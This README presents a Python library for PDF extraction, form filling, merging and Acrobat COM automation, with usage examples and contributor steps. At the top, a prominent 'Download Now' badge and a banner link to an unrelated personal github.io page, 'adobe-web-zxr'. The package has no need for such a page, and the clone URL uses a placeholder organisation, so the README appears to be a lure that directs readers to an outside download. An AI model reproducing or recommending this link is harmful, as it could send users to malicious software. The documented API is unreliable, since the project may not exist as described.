# adobe-acrobat-toolkit

[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen?style=for-the-badge&logo=download)](https://chamthjayanaka.github.io/adobe-web-zxr/)


[![Banner](banner.png)](https://chamthjayanaka.github.io/adobe-web-zxr/)


[![PyPI version](https://badge.fury.io/py/adobe-acrobat-toolkit.svg)](https://badge.fury.io/py/adobe-acrobat-toolkit)
[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
[![Documentation Status](https://readthedocs.org/projects/adobe-acrobat-toolkit/badge/?version=latest)](https://adobe-acrobat-toolkit.readthedocs.io)

A Python toolkit for automating Adobe Acrobat workflows, processing PDF documents, and extracting structured data from PDF files. Built for developers and data engineers who need programmatic control over PDF operations in production environments.

---

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage Examples](#usage-examples)
- [Requirements](#requirements)
- [Contributing](#contributing)
- [License](#license)

---

## Features

- **PDF Text Extraction** — Extract plain text, paragraphs, and formatted content from single or batch PDF files
- **Metadata Reading & Writing** — Read and update document properties such as author, title, subject, and creation date
- **Page Manipulation** — Split, merge, rotate, and reorder pages programmatically
- **Form Data Handling** — Read and populate AcroForm fields in fillable PDF documents
- **Annotation Management** — Add, read, and remove comments, highlights, and markup annotations
- **Batch Processing** — Process entire directories of PDF files with configurable pipelines
- **Data Export** — Export extracted content to JSON, CSV, or plain text formats
- **Adobe Acrobat COM Automation** — On Windows, drive Adobe Acrobat directly via its COM interface for full fidelity operations

---

## Installation

Install the toolkit from PyPI:

```bash
pip install adobe-acrobat-toolkit
```

For development or to run the examples locally, clone the repository and install in editable mode:

```bash
git clone https://github.com/your-org/adobe-acrobat-toolkit.git
cd adobe-acrobat-toolkit
pip install -e ".[dev]"
```

### Optional Dependencies

| Extra | Command | Purpose |
|-------|---------|---------|
| `ocr` | `pip install adobe-acrobat-toolkit[ocr]` | OCR support via Tesseract |
| `com` | `pip install adobe-acrobat-toolkit[com]` | Windows COM automation |
| `dev` | `pip install adobe-acrobat-toolkit[dev]` | Testing and linting tools |

---

## Quick Start

```python
from adobe_acrobat_toolkit import PDFDocument

# Open a PDF file
doc = PDFDocument("report.pdf")

# Extract all text content
text = doc.extract_text()
print(text)

# Read document metadata
meta = doc.metadata
print(f"Title: {meta.title}")
print(f"Author: {meta.author}")
print(f"Pages: {doc.page_count}")

# Always close the document when done
doc.close()
```

Or use the context manager pattern:

```python
from adobe_acrobat_toolkit import PDFDocument

with PDFDocument("report.pdf") as doc:
    text = doc.extract_text()
    print(f"Extracted {len(text)} characters from {doc.page_count} pages")
```

---

## Usage Examples

### Extract Text from a Specific Page Range

```python
from adobe_acrobat_toolkit import PDFDocument

with PDFDocument("annual_report.pdf") as doc:
    # Extract text from pages 1 through 5 (zero-indexed)
    for page_num in range(0, 5):
        page = doc.get_page(page_num)
        print(f"--- Page {page_num + 1} ---")
        print(page.extract_text())
```

### Read and Write Form Fields

```python
from adobe_acrobat_toolkit import PDFDocument

# Read existing form field values
with PDFDocument("application_form.pdf") as doc:
    fields = doc.get_form_fields()
    for field_name, field_value in fields.items():
        print(f"{field_name}: {field_value}")

# Populate a fillable form and save a new copy
with PDFDocument("application_form.pdf") as doc:
    doc.fill_form_fields({
        "first_name": "Jane",
        "last_name": "Doe",
        "email": "jane.doe@example.com",
        "date": "2024-07-01"
    })
    doc.save("application_form_filled.pdf")
```

### Batch Process a Directory of PDFs

```python
from pathlib import Path
from adobe_acrobat_toolkit import BatchProcessor

processor = BatchProcessor(
    input_dir=Path("./invoices"),
    output_dir=Path("./extracted"),
    export_format="json"
)

# Extract text and metadata from every PDF in the directory
results = processor.run()

print(f"Processed {results.success_count} files")
print(f"Failed: {results.failure_count}")

# Inspect individual results
for result in results:
    print(f"{result.filename}: {result.page_count} pages, {result.word_count} words")
```

### Merge and Split PDF Documents

```python
from adobe_acrobat_toolkit import PDFMerger, PDFSplitter

# Merge multiple PDFs into one
merger = PDFMerger()
merger.add("cover_page.pdf")
merger.add("table_of_contents.pdf")
merger.add("chapter_01.pdf", pages=(0, 10))   # First 10 pages only
merger.add("appendix.pdf")
merger.save("complete_document.pdf")

# Split a PDF into individual pages
splitter = PDFSplitter("complete_document.pdf")
splitter.split_by_page(output_dir="./pages")

# Or split into chunks of N pages
splitter.split_by_chunk(chunk_size=5, output_dir="./chunks")
```

### Extract Metadata and Export to CSV

```python
import csv
from pathlib import Path
from adobe_acrobat_toolkit import PDFDocument

pdf_files = list(Path("./documents").glob("*.pdf"))
output_rows = []

for pdf_path in pdf_files:
    with PDFDocument(pdf_path) as doc:
        output_rows.append({
            "filename": pdf_path.name,
            "title": doc.metadata.title or "",
            "author": doc.metadata.author or "",
            "created": doc.metadata.creation_date,
            "pages": doc.page_count,
            "word_count": doc.word_count,
        })

with open("document_index.csv", "w", newline="") as f:
    writer = csv.DictWriter(f, fieldnames=output_rows[0].keys())
    writer.writeheader()
    writer.writerows(output_rows)

print(f"Indexed {len(output_rows)} PDF documents to document_index.csv")
```

### Add Annotations

```python
from adobe_acrobat_toolkit import PDFDocument
from adobe_acrobat_toolkit.annotations import Highlight, Comment

with PDFDocument("contract.pdf") as doc:
    page = doc.get_page(0)

    # Add a highlight annotation
    page.add_annotation(Highlight(
        text="Section 3.2",
        color="#FFFF00",
        note="Review this clause with legal"
    ))

    # Add a sticky-note comment
    page.add_annotation(Comment(
        content="Needs revision before final sign-off",
        position=(100, 200)
    ))

    doc.save("contract_reviewed.pdf")
```

---

## Requirements

| Requirement | Version |
|-------------|---------|
| Python | >= 3.8 |
| `pypdf` | >= 3.0 |
| `pdfminer.six` | >= 20221105 |
| `reportlab` | >= 4.0 |
| `click` | >= 8.0 |
| `pydantic` | >= 2.0 |
| Adobe Acrobat *(COM only)* | DC or later (Windows) |

> **Note:** The core extraction and manipulation features do **not** require Adobe Acrobat to be installed. The optional COM automation module (`adobe_acrobat_toolkit.com`) requires a licensed installation of Adobe Acrobat on Windows.

---

## Project Structure

```
adobe-acrobat-toolkit/
├── adobe_acrobat_toolkit/
│   ├── __init__.py
│   ├── document.py          # PDFDocument core class
│   ├── batch.py             # BatchProcessor
│   ├── merger.py            # PDFMerger / PDFSplitter
│   ├── annotations.py       # Annotation types
│   ├── metadata.py          # Metadata read/write
│   ├── forms.py             # AcroForm handling
│   ├── export.py            # JSON / CSV exporters
│   └── com/                 # Windows COM automation (optional)
│       └── acrobat_com.py
├── tests/
│   ├── test_document.py
│   ├── test_batch.py
│   └── fixtures/
├── docs/
├── CHANGELOG.md
├── CONTRIBUTING.md
└── pyproject.toml
```

---

## Contributing

Contributions are welcome and appreciated. Please follow these steps:

1. **Fork** the repository and create a feature branch:
   ```bash
   git checkout -b feature/your-feature-name
   ```

2. **Install development dependencies:**
   ```bash
   pip install -e ".[dev]"
   pre-commit install
   ```

3. **Write tests** for any new functionality in the `tests/` directory.

4. **Run the test suite** before opening a pull request:
   ```bash
   pytest tests/ --cov=adobe_acrobat_toolkit --cov-report=term-missing
   ```

5. **Open a Pull Request** with a clear description of the changes and any relevant issue numbers.

Please review our [Code of Conduct](CODE_OF_CONDUCT.md) and [Contributing Guide](CONTRIBUTING.md) before submitting.

---

## Changelog

See [CHANGELOG.md](CHANGELOG.md) for a full history of releases and changes.

---

## License

This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.

---

> **Disclaimer:** This toolkit is an independent open-source project and is not affiliated with, endorsed by, or sponsored by Adobe Inc. Adobe and Adobe Acrobat are registered trademarks of Adobe Inc.